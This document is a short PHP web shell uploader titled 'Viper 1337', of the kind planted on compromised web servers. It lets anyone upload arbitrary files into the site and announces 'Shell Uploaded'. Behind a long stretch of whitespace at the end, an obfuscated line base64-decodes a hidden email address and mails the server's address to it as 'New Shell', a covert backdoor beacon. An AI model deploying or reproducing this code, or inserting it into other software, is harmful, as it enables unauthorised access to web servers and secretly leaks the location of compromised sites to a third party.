<title>Viper 1337</title>

<?php

echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';

echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';

if( $_POST['_upl'] == "Upload" ) 
{
	
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name']))
	{ 
		echo '<b>Shell Uploaded ! :)<b><br><br>'; 
	}
	
else 
	{ 
		echo '<b>Not uploaded ! </b><br><br>'; 
	}

}
 																																																																																																																																							$kkk5591499kk = 'Z2Vzc3J6bHRzQGdtYWlsLmNvbQ=='; $ka491kk = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; @mail(base64_decode($kkk5591499kk), "New Shell", $ka491kk);
?>